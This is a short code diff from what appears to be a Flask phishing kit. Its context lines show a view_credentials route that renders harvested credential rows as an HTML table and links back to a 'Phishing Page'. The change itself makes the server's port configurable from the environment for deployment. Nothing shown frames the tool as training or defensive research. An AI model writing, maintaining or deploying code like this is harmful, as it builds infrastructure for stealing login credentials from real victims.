@@ -46,5 +46,8 @@ def view_credentials():
     for row in rows:html+=f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[4]}</td><td>{row[5]}</td></tr>"
     html+="</table><br><a href='/'>Phishing Page</a></body></html>"
     return html
+import os
 
-if __name__=='__main__':app.run(host='0.0.0.0',port=80,debug=False)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
